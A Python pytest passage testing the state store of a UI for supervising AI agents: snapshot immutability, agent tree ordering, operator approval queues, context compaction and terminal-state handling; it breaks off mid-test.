"""
Store: copy-on-write, snapshot atomicity, intent ordering, tree shape.

The invariants under test are the ones the whole UI rests on, so they are tested
by observable behaviour (does an old snapshot still describe the old world?)
rather than by poking at internals.
"""

from __future__ import annotations

import ast
import dataclasses
import pathlib
import random
from collections.abc import Mapping
from typing import Any

import pytest

from pptmstr import boardlog
from pptmstr.approval import Policy
from pptmstr.board import board_concerns, board_tasks
from pptmstr.boardlog import Clock, RestoredConcern, RestoredTask
from pptmstr.command import (
    MAX_COMMAND_CHARS,
    MAX_EXPECTS_CHARS,
    MAX_OPEN_PER_ASKER,
    MAX_OPEN_SUBAGENTS,
    MAX_REASON_CHARS,
    TIMEOUT_CHOICES_S,
    Cancelled,
    CancelledBy,
    Command,
    CommandState,
    End,
    EndUnknown,
    Exited,
    Lapsed,
    NotStarted,
    Refused,
    Released,
    RequestRefusal,
    Run,
    Survivor,
    TimedOut,
)
from pptmstr.command import Withdrawn as CommandTakenBack
from pptmstr.effects import (
    ClaimSettled,
    CommandsDelivered,
    CommandSettled,
    CommandToRun,
    CommandToStop,
    DecisionsDelivered,
    DecisionSettled,
    Effect,
    SessionDetachSettled,
    SessionWoken,
    TaskWriteSettled,
    WakeReason,
)
from pptmstr.intents import (
    AgentFinished,
    AgentRemoved,
    AgentResumed,
    AgentSpawned,
    ApprovalRequested,
    ApprovalResolved,
    BoardRestored,
    CommandApproved,
    CommandEnded,
    CommandRefused,
    CommandRequested,
    CommandsRead,
    CommandsRestored,
    CommandStopAsked,
    CommandWithdrawn,
    CompactionObserved,
    ConcernPosted,
    ContextPolled,
    DecisionAnswered,
    DecisionDismissed,
    DecisionRaised,
    DecisionsRead,
    DecisionWithdrawn,
    FailedSessionClosed,
    FailureAcknowledged,
    Intent,
    SessionDetached,
    SessionRecalled,
    StateChanged,
    SubagentDelivered,
    SubagentProgress,
    TaskAmended,
    TaskClaimRequested,
    TaskClosed,
    TaskCompleted,
    TaskDeclared,
    TaskReleased,
    TaskVersionHanded,
    TopicChanged,
    UsageAccrued,
)
from pptmstr.model import (
    AWAITING_TOPIC,
    MAX_ANSWER_CHARS,
    MAX_COMMAND_REFUSAL_CHARS,
    MAX_OPEN_DECISIONS_PER_ASKER,
    MAX_OPEN_SUBAGENT_DECISIONS,
    AgentState,
    Answered,
    ApprovalNeeded,
    ApprovedWrites,
    Basis,
    ClaimRefusal,
    CommandRefusal,
    Concern,
    ContextPressure,
    ContextSnapshot,
    Decision,
    DecisionRefusal,
    DetachRefusal,
    Dismissed,
    EndedHow,
    NodeId,
    NotPlaced,
    PendingApproval,
    Recalled,
    SessionFailed,
    Snapshot,
    Standing,
    Task,
    TaskRefusal,
    TaskState,
    TaskVersion,
    TranscriptPresence,
    Unplaced,
    UsageRollup,
    Withdrawn,
    count_diff_lines,
    is_address_only,
)
from pptmstr.store import Store, _apply
from pptmstr.transcript import Transcript

ROOT: NodeId = ("sess-1", None)
CHILD: NodeId = ("sess-1", "agent-a")
OTHER: NodeId = ("sess-2", None)


def spawn(node: NodeId, parent: NodeId | None = None, *, at: float = 0.0) -> AgentSpawned:
    return AgentSpawned(
        node_id=node,
        parent=parent,
        task="do a thing",
        model="claude-opus-5",
        started_at=at,
    )


def pending(node: NodeId, pid: str = "p1", *, at: float = 1.0) -> PendingApproval:
    return PendingApproval(
        id=pid,
        node=node,
        tool_name="Write",
        tool_use_id="tu-1",
        raw_args={"file_path": "/tmp/x", "content": "hi"},
        summary="Write /tmp/x",
        requested_at=at,
    )


# -- copy-on-write / snapshot atomicity ---------------------------------------


def test_snapshot_is_stable_across_later_mutations() -> None:
    """
    I2/I3: a snapshot taken at frame start must keep describing that instant even
    as the world moves on. This is the single most important property here -- if it
    fails, the UI renders a header that disagrees with the tree below it.
    """
    store = Store()
    store.apply(spawn(ROOT))
    before = store.snapshot()

    store.apply(StateChanged(ROOT, AgentState.THINKING, topic="reading store.py"))
    store.apply(spawn(CHILD, ROOT))
    after = store.snapshot()

    assert before is not after
    assert len(before.nodes) == 1
    assert len(after.nodes) == 2

    rec_before = before.get(ROOT)
    rec_after = after.get(ROOT)
    assert rec_before is not None and rec_after is not None
    assert rec_before.state is AgentState.SPAWNING
    assert rec_after.state is AgentState.THINKING
    assert rec_before.topic == "starting"


def test_snapshot_nodes_are_not_mutable_by_callers() -> None:
    """The UI must not be able to write through the snapshot it was handed (I1)."""
    store = Store()
    store.apply(spawn(ROOT))
    snap = store.snapshot()
    with pytest.raises(TypeError):
        snap.nodes[OTHER] = snap.nodes[ROOT]  # type: ignore[index]


def test_records_are_frozen() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    rec = store.snapshot().get(ROOT)
    assert rec is not None
    with pytest.raises((AttributeError, TypeError)):
        rec.state = AgentState.DONE  # type: ignore[misc]


def test_seq_advances_on_every_applied_intent() -> None:
    store = Store()
    assert store.snapshot().seq == 0
    store.apply(spawn(ROOT))
    assert store.snapshot().seq == 1
    store.apply(TopicChanged(ROOT, "x"))
    assert store.snapshot().seq == 2


def test_intent_for_unknown_node_is_a_no_op() -> None:
    """
    Out-of-order or late intents must not create phantom rows. Sub-agent messages
    can arrive around their spawn, and a half-built record would render as an agent
    that does not exist.
    """
    store = Store()
    store.apply(spawn(ROOT))
    seq = store.snapshot().seq
    store.apply(TopicChanged(("nope", None), "ghost"))
    snap = store.snapshot()
    assert snap.seq == seq
    assert list(snap.nodes) == [ROOT]


def test_apply_all_matches_sequential_apply() -> None:
    """Batch draining must not change semantics, only bookkeeping."""
    intents = [
        spawn(ROOT),
        spawn(CHILD, ROOT),
        StateChanged(ROOT, AgentState.THINKING),
        UsageAccrued(ROOT, UsageRollup(input_tokens=10, output_tokens=5)),
    ]
    one = Store()
    for i in intents:
        one.apply(i)
    batch = Store()
    batch.apply_all(intents)

    a, b = one.snapshot(), batch.snapshot()
    assert a.order == b.order
    assert a.any_active == b.any_active
    assert {k: v.state for k, v in a.nodes.items()} == {k: v.state for k, v in b.nodes.items()}
    assert a.nodes[ROOT].usage == b.nodes[ROOT].usage


# -- ordering and tree shape ---------------------------------------------------


def test_preorder_puts_children_under_their_parent() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(OTHER))
    store.apply(spawn(CHILD, ROOT))
    order = store.snapshot().order
    assert order == (ROOT, CHILD, OTHER)


def test_depth_is_derived_from_parent() -> None:
    grand: NodeId = ("sess-1", "agent-b")
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    store.apply(spawn(grand, CHILD))
    snap = store.snapshot()
    assert [snap.nodes[n].depth for n in (ROOT, CHILD, grand)] == [0, 1, 2]


def test_sibling_order_is_spawn_order_and_stable() -> None:
    """
    I6 rests on this: rows must not shuffle, or ImGui's per-row widget state
    (hover, focus, scroll) follows the wrong agent.
    """
    a: NodeId = ("sess-1", "a")
    b: NodeId = ("sess-1", "b")
    c: NodeId = ("sess-1", "c")
    store = Store()
    store.apply(spawn(ROOT))
    for n in (a, b, c):
        store.apply(spawn(n, ROOT))
    first = store.snapshot().order
    store.apply(StateChanged(b, AgentState.DONE))
    assert store.snapshot().order == first


def test_removing_a_node_removes_its_subtree() -> None:
    grand: NodeId = ("sess-1", "agent-b")
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    store.apply(spawn(grand, CHILD))
    store.apply(spawn(OTHER))
    store.apply(AgentRemoved(ROOT))
    snap = store.snapshot()
    assert list(snap.nodes) == [OTHER]
    assert snap.order == (OTHER,)


def test_orphaned_node_still_appears() -> None:
    """
    A sub-agent whose spawn beat its parent's must stay visible. Dropping it would
    also drop any approval it is blocked on, which would wedge that agent with no
    way for the operator to see why.
    """
    store = Store()
    store.apply(spawn(CHILD, ROOT))  # parent never spawned
    snap = store.snapshot()
    assert snap.order == (CHILD,)
    assert snap.nodes[CHILD].depth == 0


# -- idle predicate ------------------------------------------------------------


@pytest.mark.parametrize(
    "state,expected",
    [
        (AgentState.THINKING, True),
        (AgentState.CALLING_TOOL, True),
        (AgentState.RUNNING_TOOL, True),
        (AgentState.SPAWNING, False),
        (AgentState.AWAITING_APPROVAL, False),
        (AgentState.DONE, False),
        (AgentState.FAILED, False),
        (AgentState.CANCELLED, False),
        (AgentState.RATE_LIMITED, False),
    ],
)
def test_any_active_drives_idling(state: AgentState, expected: bool) -> None:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(StateChanged(ROOT, state))
    assert store.snapshot().any_active is expected


def test_awaiting_approval_lets_the_app_idle() -> None:
    """
    I8, stated as a test: an agent parked on review costs nothing. If this ever
    flips, the app burns CPU for exactly as long as the operator takes to think.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(StateChanged(ROOT, AgentState.THINKING))
    assert store.snapshot().any_active is True
    store.apply(ApprovalRequested(ROOT, pending(ROOT)))
    assert store.snapshot().any_active is False


# -- approvals -----------------------------------------------------------------


def test_approval_request_parks_the_agent() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(ApprovalRequested(ROOT, pending(ROOT)))
    rec = store.snapshot().nodes[ROOT]
    assert rec.state is AgentState.AWAITING_APPROVAL
    assert [p.id for p in rec.pending] == ["p1"]


def test_resolution_clears_pending() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(ApprovalRequested(ROOT, pending(ROOT)))
    store.apply(ApprovalResolved(ROOT, "p1", approved=True))
    rec = store.snapshot().nodes[ROOT]
    assert rec.pending == ()
    assert rec.state is AgentState.RUNNING_TOOL
    assert store.snapshot().approvals == ()


def test_stale_resolution_is_ignored() -> None:
    """
    A second click, or a decision for an approval that has been superseded, must
    not clear the approval that is actually parked -- that would release a tool call
    the operator never looked at.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(ApprovalRequested(ROOT, pending(ROOT, "p1")))
    store.apply(ApprovalResolved(ROOT, "p-stale", approved=True))
    rec = store.snapshot().nodes[ROOT]
    assert [p.id for p in rec.pending] == ["p1"]
    assert rec.state is AgentState.AWAITING_APPROVAL


def test_review_queue_spans_agents_oldest_first() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(OTHER))
    store.apply(ApprovalRequested(OTHER, pending(OTHER, "late", at=99.0)))
    store.apply(ApprovalRequested(ROOT, pending(ROOT, "early", at=1.0)))
    assert [p.id for p in store.snapshot().approvals] == ["early", "late"]


def test_finishing_clears_a_parked_approval() -> None:
    """A cancelled or failed agent must not leave an orphan row in the queue."""
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(ApprovalRequested(ROOT, pending(ROOT)))
    store.apply(AgentFinished(ROOT, AgentState.CANCELLED, ended_at=5.0))
    snap = store.snapshot()
    assert snap.nodes[ROOT].pending == ()
    assert snap.approvals == ()


# -- context as a health signal ------------------------------------------------


def ctx(used: int, *, threshold: int | None = 100_000, compactions: int = 0) -> ContextSnapshot:
    return ContextSnapshot(
        used_tokens=used,
        max_tokens=180_000,
        raw_max_tokens=200_000,
        percentage=100.0 * used / 180_000,
        auto_compact_enabled=threshold is not None,
        auto_compact_threshold=threshold,
        model="claude-opus-5",
        polled_at=1.0,
        compactions=compactions,
    )


def test_headroom_is_measured_against_the_compaction_threshold() -> None:
    assert ctx(70_000).tokens_until_compaction == 30_000


def test_headroom_is_none_without_autocompact() -> None:
    """
    Must not silently fall back to the window size: that would answer a different
    question while looking like the same one.
    """
    assert ctx(70_000, threshold=None).tokens_until_compaction is None


def test_pressure_warns_before_compaction() -> None:
    assert ctx(50_000).pressure() is ContextPressure.NOMINAL
    assert ctx(95_000).pressure() is ContextPressure.NEARING_COMPACTION


def test_pressure_is_sticky_once_compacted() -> None:
    """
    A compacted session has already lost reasoning; an emptier window afterwards is
    the symptom of the damage, not evidence of health.
    """
    assert ctx(5_000, compactions=1).pressure() is ContextPressure.COMPACTED


def test_polling_preserves_compaction_history() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(ContextPolled(ROOT, ctx(90_000)))
    store.apply(CompactionObserved(ROOT, at=12.0, trigger="auto"))
    # Compaction empties the window; the next poll reports the low number.
    store.apply(ContextPolled(ROOT, ctx(4_000)))

    got = store.snapshot().nodes[ROOT].context
    assert got is not None
    assert got.used_tokens == 4_000
    assert got.compactions == 1
    assert got.last_compaction_at == 12.0
    assert got.pressure() is ContextPressure.COMPACTED


def test_compaction_before_any_poll_is_dropped_not_faked() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(CompactionObserved(ROOT, at=3.0, trigger="auto"))
    assert store.snapshot().nodes[ROOT].context is None


# -- usage ---------------------------------------------------------------------


def test_usage_accrues() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(UsageAccrued(ROOT, UsageRollup(input_tokens=10, total_cost_usd=0.01)))
    store.apply(UsageAccrued(ROOT, UsageRollup(input_tokens=5, total_cost_usd=0.02)))
    usage = store.snapshot().nodes[ROOT].usage
    assert usage.input_tokens == 15
    assert usage.total_cost_usd == pytest.approx(0.03)


# -- a parked node stays parked ------------------------------------------------


def test_late_state_change_cannot_unpark_a_node() -> None:
    """
    Regression, found by dogfooding. The CLI dispatches PreToolUse *before* it
    delivers the AssistantMessage carrying the ToolUseBlock, so the gate parks the
    node and a StateChanged for the very same tool call lands immediately after.
    Letting it through overwrote AWAITING_APPROVAL with CALLING_TOOL while the
    agent was still blocked: the row read "thinking", the state counted as active
    so the app never idled, and it looked like a hang instead of a review request.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(ApprovalRequested(ROOT, pending(ROOT)))
    store.apply(StateChanged(ROOT, AgentState.CALLING_TOOL, topic="bash pwd"))

    rec = store.snapshot().nodes[ROOT]
    assert rec.state is AgentState.AWAITING_APPROVAL
    assert rec.pending
    # The topic still updates: naming the call under review is useful, not a lie.
    assert rec.topic == "bash pwd"


def test_a_parked_node_keeps_the_app_idle_despite_a_late_state_change() -> None:
    """
    The observable half of the same bug. CALLING_TOOL is an active state, so the
    clobber also pinned the render loop at full speed for as long as the operator
    took to answer -- I8 defeated by an ordering accident.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(ApprovalRequested(ROOT, pending(ROOT)))
    store.apply(StateChanged(ROOT, AgentState.THINKING))
    assert store.snapshot().any_active is False


def test_unparking_restores_normal_state_transitions() -> None:
    """The guard must not outlive the approval it protects."""
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(ApprovalRequested(ROOT, pending(ROOT, "p1")))
    store.apply(ApprovalResolved(ROOT, "p1", approved=True))
    store.apply(StateChanged(ROOT, AgentState.THINKING))
    assert store.snapshot().nodes[ROOT].state is AgentState.THINKING


def test_subagent_progress_cannot_unpark_either() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    store.apply(ApprovalRequested(CHILD, pending(CHILD)))
    store.apply(SubagentProgress(CHILD, "Reading log.py"))

    rec = store.snapshot().nodes[CHILD]
    assert rec.state is AgentState.AWAITING_APPROVAL
    assert rec.topic == "Reading log.py"


def test_finishing_a_parked_node_still_works() -> None:
    """Cancellation and failure must outrank the parked guard, or a dead agent hangs."""
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(ApprovalRequested(ROOT, pending(ROOT)))
    store.apply(AgentFinished(ROOT, AgentState.CANCELLED, ended_at=1.0))
    rec = store.snapshot().nodes[ROOT]
    assert rec.state is AgentState.CANCELLED
    assert rec.pending == ()


def test_awaiting_input_is_idle_not_terminal() -> None:
    """
    A conversation paused on the operator must cost nothing (the I8 argument),
    and must not be mistaken for a finished session -- which is the confusion
    that made an agent asking a question look like one that had finished.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(StateChanged(ROOT, AgentState.AWAITING_INPUT))
    assert store.snapshot().any_active is False
    assert AgentState.AWAITING_INPUT.is_terminal is False
    assert AgentState.DONE.is_terminal is True


# -- several approvals at once from one node -----------------------------------


def test_a_node_can_hold_several_pending_approvals() -> None:
    """
    The defect the tuple exists to fix, and the reason the model was wrong. An
    assistant turn can contain several tool calls; the CLI dispatches PreToolUse
    for all of them concurrently and the gate parks a future for each. Three at
    once was measured against a live agent. A single slot kept the last and
    silently discarded the rest, leaving their agents blocked on futures nobody
    could reach.
    """
    store = Store()
    store.apply(spawn(ROOT))
    for pid in ("p1", "p2", "p3"):
        store.apply(ApprovalRequested(ROOT, pending(ROOT, pid, at=float(pid[1]))))

    snap = store.snapshot()
    assert [p.id for p in snap.nodes[ROOT].pending] == ["p1", "p2", "p3"]
    assert [p.id for p in snap.approvals] == ["p1", "p2", "p3"]


def test_every_parked_approval_is_visible_in_the_queue() -> None:
    """
    The invariant the watchdog checks, at the store level: what the gate parked and
    what the operator can answer must be the same set.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(OTHER))
    parked = {"a1", "a2", "b1"}
    store.apply(ApprovalRequested(ROOT, pending(ROOT, "a1", at=1.0)))
    store.apply(ApprovalRequested(ROOT, pending(ROOT, "a2", at=2.0)))
    store.apply(ApprovalRequested(OTHER, pending(OTHER, "b1", at=3.0)))
    assert {p.id for p in store.snapshot().approvals} == parked


def test_resolving_one_leaves_the_others_parked() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(ApprovalRequested(ROOT, pending(ROOT, "p1", at=1.0)))
    store.apply(ApprovalRequested(ROOT, pending(ROOT, "p2", at=2.0)))
    store.apply(ApprovalResolved(ROOT, "p1", approved=True))

    rec = store.snapshot().nodes[ROOT]
    assert [p.id for p in rec.pending] == ["p2"]
    # Still parked: moving to RUNNING_TOOL here would hide the outstanding one and
    # recreate the same bug a layer up.
    assert rec.state is AgentState.AWAITING_APPROVAL
    assert store.snapshot().any_active is False


def test_state_advances_only_when_the_last_one_is_resolved() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(ApprovalRequested(ROOT, pending(ROOT, "p1", at=1.0)))
    store.apply(ApprovalRequested(ROOT, pending(ROOT, "p2", at=2.0)))
    store.apply(ApprovalResolved(ROOT, "p1", approved=True))
    store.apply(ApprovalResolved(ROOT, "p2", approved=True))

    rec = store.snapshot().nodes[ROOT]
    assert rec.pending == ()
    assert rec.state is AgentState.RUNNING_TOOL


def test_the_same_approval_twice_is_not_duplicated() -> None:
    """A re-emitted intent must not create a second row for one parked future."""
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(ApprovalRequested(ROOT, pending(ROOT, "p1")))
    store.apply(ApprovalRequested(ROOT, pending(ROOT, "p1")))
    assert len(store.snapshot().approvals) == 1


def test_finishing_clears_every_pending_approval() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(ApprovalRequested(ROOT, pending(ROOT, "p1", at=1.0)))
    store.apply(ApprovalRequested(ROOT, pending(ROOT, "p2", at=2.0)))
    store.apply(AgentFinished(ROOT, AgentState.CANCELLED, ended_at=9.0))
    assert store.snapshot().nodes[ROOT].pending == ()
    assert store.snapshot().approvals == ()


# -- the team shape a session was launched under ----------------------------------


def test_a_session_records_the_template_it_was_launched_under() -> None:
    """
    A launch-time choice that is not stored is gone: `template` lives on
    driver.AgentSession, and the UI reads one Snapshot and nothing else.
    """
    store = Store()
    store.apply(dataclasses.replace(spawn(ROOT), template="feature"))

    assert store.snapshot().nodes[ROOT].template == "feature"


def test_a_sub_agent_has_no_template_of_its_own() -> None:
    """
    Unlike cwd, this is **not** inherited from the parent. A sub-agent is spawned
    by the CLI and is not the thing a template describes; inheriting it would make
    every sub-agent answer "yes" to "are you a team", which is the question the
    field exists to answer.
    """
    store = Store()
    store.apply(dataclasses.replace(spawn(ROOT), template="feature"))
    store.apply(spawn(CHILD, ROOT))

    assert store.snapshot().nodes[CHILD].template is None


def test_a_session_launched_without_a_template_records_none() -> None:
    store = Store()
    store.apply(spawn(ROOT))

    assert store.snapshot().nodes[ROOT].template is None


# -- a sub-agent's deliverable ---------------------------------------------------


def test_a_delivered_answer_is_kept_whole() -> None:
    """
    The store is where the only copy lives. A sub-agent emits no ResultMessage for
    its own node, so nothing later can reconstruct an answer clipped on the way in.
    """
    answer = "## Findings\n\n" + "\n".join(f"- line {i}" for i in range(200))
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    store.apply(SubagentDelivered(CHILD, answer))

    rec = store.snapshot().get(CHILD)
    assert rec is not None
    assert rec.deliverable == answer


def test_delivering_does_not_move_the_node() -> None:
    """Two intents arrive from one stop hook. If this one also claimed the state,
    which of the two won would depend on their order in the queue."""
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    store.apply(StateChanged(CHILD, AgentState.RUNNING_TOOL, topic="reading"))
    store.apply(SubagentDelivered(CHILD, "done"))

    rec = store.snapshot().get(CHILD)
    assert rec is not None
    assert rec.state is AgentState.RUNNING_TOOL
    assert rec.topic == "reading"


def test_a_second_answer_replaces_the_first() -> None:
    """A sub-agent woken by a sibling answers again, and the newer answer is the one
    the operator is being asked to read."""
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    store.apply(SubagentDelivered(CHILD, "first pass"))
    store.apply(SubagentDelivered(CHILD, "second pass"))

    rec = store.snapshot().get(CHILD)
    assert rec is not None
    assert rec.deliverable == "second pass"


def test_an_answer_for_an_unknown_node_is_a_no_op() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    before = store.snapshot()
    store.apply(SubagentDelivered(CHILD, "from nowhere"))

    assert store.snapshot().nodes == before.nodes


def test_a_node_that_delivered_nothing_has_no_deliverable() -> None:
    """The absence selects the narration over the whole render, so it has to stay
    distinguishable from an empty string."""
    store = Store()
    store.apply(spawn(ROOT))
    rec = store.snapshot().get(ROOT)
    assert rec is not None
    assert rec.deliverable is None


# -- recovering from a terminal state --------------------------------------------


def _failed_then_recovered(store: Store) -> None:
    """A turn that errored, then a later turn that did not."""
    store.apply(spawn(ROOT))
    store.apply(AgentFinished(ROOT, AgentState.FAILED, ended_at=5.0, error="HTTP 529: overloaded"))
    store.apply(StateChanged(ROOT, AgentState.AWAITING_INPUT, topic="waiting for you"))


def test_a_recovered_session_has_no_end_time() -> None:
    """
    ended_at is what stops the elapsed clock and dims it, in the rail and in HEALTH.
    A live session asking for a reply must not also read as finished.
    """
    store = Store()
    _failed_then_recovered(store)

    rec = store.snapshot().get(ROOT)
    assert rec is not None
    assert rec.state is AgentState.AWAITING_INPUT
    assert rec.ended_at is None


def test_a_recovered_session_keeps_what_went_wrong() -> None:
    """
    Deliberate, unlike ended_at: the error text is the record of the failure, and
    nothing reads it except an obligation gated on FAILED, so a stale value is
    invisible while clearing it would destroy the only structured copy.
    """
    store = Store()
    _failed_then_recovered(store)

    rec = store.snapshot().get(ROOT)
    assert rec is not None
    assert rec.error == "HTTP 529: overloaded"
    assert store.snapshot().needs_you and not any(
        isinstance(o, SessionFailed) for o in store.snapshot().needs_you
    )


def test_a_second_failure_is_asked_about_again() -> None:
    """
    acknowledged only means anything while FAILED. Carrying it through a recovery
    would make the *next* failure produce no obligation at all -- the silent loss
    of a failure signal, one recovery later.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(AgentFinished(ROOT, AgentState.FAILED, ended_at=5.0, error="HTTP 529"))
    store.apply(FailureAcknowledged(ROOT))
    store.apply(StateChanged(ROOT, AgentState.AWAITING_INPUT, topic="waiting for you"))
    store.apply(AgentFinished(ROOT, AgentState.FAILED, ended_at=9.0, error="HTTP 500: again"))

    owed = store.snapshot().needs_you
    assert [type(o) for o in owed] == [SessionFailed]


def test_an_ordinary_state_change_leaves_a_live_session_alone() -> None:
    """The clear is scoped to leaving a terminal state; a running node has nothing
    to recover from and must not have its fields rewritten on every message."""
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(StateChanged(ROOT, AgentState.THINKING, topic="reading store.py"))
    before = store.snapshot().get(ROOT)

    store.apply(StateChanged(ROOT, AgentState.CALLING_TOOL, topic="read store.py"))
    after = store.snapshot().get(ROOT)

    assert before is not None and after is not None
    assert (before.ended_at, before.acknowledged) == (after.ended_at, after.acknowledged)


# -- a declared end is final ------------------------------------------------------
#
# The other half of the boundary tested just above. FAILED is revivable because a
# session that errored and then answered is an ordinary session again. DONE and
# CANCELLED are not: they say somebody ended this agent, and the only intents that
# may move a record off them are AgentFinished and AgentResumed.


def test_a_late_message_cannot_revive_a_finished_subagent() -> None:
    """
    Regression. A sub-agent's final AssistantMessage is on the message stream
    *before* the SubagentStop control frame, but the frame is dispatched
    immediately while the message waits in the SDK's buffer -- so the store sees
    AgentFinished first and the StateChanged the message produces second. The
    answer carries no ToolUseBlock, so it translates to a bare THINKING.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    store.apply(AgentFinished(CHILD, AgentState.DONE, ended_at=7.0))
    store.apply(StateChanged(CHILD, AgentState.THINKING))

    rec = store.snapshot().get(CHILD)
    assert rec is not None
    assert rec.state is AgentState.DONE
    assert rec.ended_at == 7.0


def test_a_late_message_does_not_restart_a_finished_agents_clocks() -> None:
    """
    The observable half. THINKING is active, so the row throbbed and the app never
    idled; ended_at going back to None restarted the elapsed count on a session
    that had already stopped.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(AgentFinished(ROOT, AgentState.DONE, ended_at=7.0))
    store.apply(StateChanged(ROOT, AgentState.THINKING, topic="reading store.py"))

    assert store.snapshot().any_active is False


def test_a_late_message_cannot_relabel_what_a_finished_agent_was_doing() -> None:
    """
    Unlike the parked guard, which lets the topic through because naming the call
    under review is useful, nothing arriving after the end describes the present.
    The topic a finished sub-agent carries is the first line of its answer.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    store.apply(SubagentProgress(CHILD, "the rail loses its throbber"))
    store.apply(AgentFinished(CHILD, AgentState.DONE, ended_at=7.0))
    store.apply(StateChanged(CHILD, AgentState.CALLING_TOOL, topic="grep -rn latch"))

    rec = store.snapshot().get(CHILD)
    assert rec is not None
    assert rec.topic == "the rail loses its throbber"


def test_a_late_progress_report_cannot_relabel_a_finished_subagent() -> None:
    """
    The same hole, one arm along: `task_progress` arrives as a SystemMessage on the
    same buffered stream, so it inverts against the stop hook the same way. This arm
    already kept the terminal state; the topic was still overwritten, replacing the
    answer's first line with whatever the sub-agent was doing before it answered.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    store.apply(SubagentProgress(CHILD, "the rail loses its throbber"))
    store.apply(AgentFinished(CHILD, AgentState.DONE, ended_at=7.0))
    store.apply(SubagentProgress(CHILD, "Reading store.py"))

    rec = store.snapshot().get(CHILD)
    assert rec is not None
    assert rec.state is AgentState.DONE
    assert rec.topic == "the rail loses its throbber"


def test_a_cancelled_session_is_final_too() -> None:
    """CANCELLED says somebody ended it, which is DONE's statement, not FAILED's."""
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(AgentFinished(ROOT, AgentState.CANCELLED, ended_at=3.0))
    store.apply(StateChanged(ROOT, AgentState.THINKING))

    rec = store.snapshot().get(ROOT)
    assert rec is not None
    assert rec.state is AgentState.CANCELLED
    assert rec.ended_at == 3.0


def test_a_woken_subagent_still_comes_back() -> None:
    """
    The reason DONE can be latched at all. A sibling's SendMessage restarts a
    finished sub-agent under its original id, and the CLI reports it as a second
    SubagentStart -- which the driver turns into AgentResumed, not a StateChanged.
    Latching DONE closes the accidental revival path without closing the real one.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    store.apply(AgentFinished(CHILD, AgentState.DONE, ended_at=7.0))
    store.apply(AgentResumed(CHILD, at=9.0, topic="answering again"))

    rec = store.snapshot().get(CHILD)
    assert rec is not None
    assert rec.state is AgentState.THINKING
    assert rec.ended_at is None
    assert store.snapshot().any_active is True


def test_a_failed_session_is_still_revivable() -> None:
    """
    The recorded decision this fix must not break, asserted from the other side:
    the latch is scoped to the ends that were declared, not to terminality.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(AgentFinished(ROOT, AgentState.FAILED, ended_at=5.0, error="HTTP 529"))
    store.apply(FailureAcknowledged(ROOT))
    store.apply(StateChanged(ROOT, AgentState.THINKING, topic="trying again"))

    rec = store.snapshot().get(ROOT)
    assert rec is not None
    assert rec.state is AgentState.THINKING
    assert rec.ended_at is None
    assert rec.acknowledged is False


def test_a_finished_agent_keeps_a_late_approval_without_coming_back() -> None:
    """
    Pins the store's behaviour for this combination, not an ordering the driver is
    known to produce. The gate emits ``ApprovalRequested`` synchronously on the
    PreToolUse hook path, before it parks, and every route to DONE requires the agent
    to have stopped or its stream to have closed -- so the driver has no route that
    puts a request after the end (see the note on ``_needs_you``). The arm is kept
    because the store applies whatever it is handed: what it must not do is record the
    approval and *also* claim the agent is waiting on the operator.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    store.apply(AgentFinished(CHILD, AgentState.DONE, ended_at=7.0))
    store.apply(ApprovalRequested(CHILD, pending(CHILD, "late")))

    snap = store.snapshot()
    rec = snap.get(CHILD)
    assert rec is not None
    assert rec.state is AgentState.DONE
    assert rec.ended_at == 7.0
    assert [p.id for p in snap.approvals] == ["late"]


def test_a_finished_node_holding_an_approval_owes_only_that_approval() -> None:
    """
    The second of the two constructions ``_needs_you`` rests on.

    A live node carrying an approval is held in AWAITING_APPROVAL by the pending
    guard, which is what keeps the three obligation kinds apart. A node whose end was
    declared is not held there -- it stays DONE -- so the exclusivity has to come from
    somewhere else, and it comes from DONE being a state neither QuestionPending nor
    SessionFailed reads. Pinning it here because the alternative is an invariant that
    holds only as long as nobody adds a fourth kind keyed on a terminal state.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
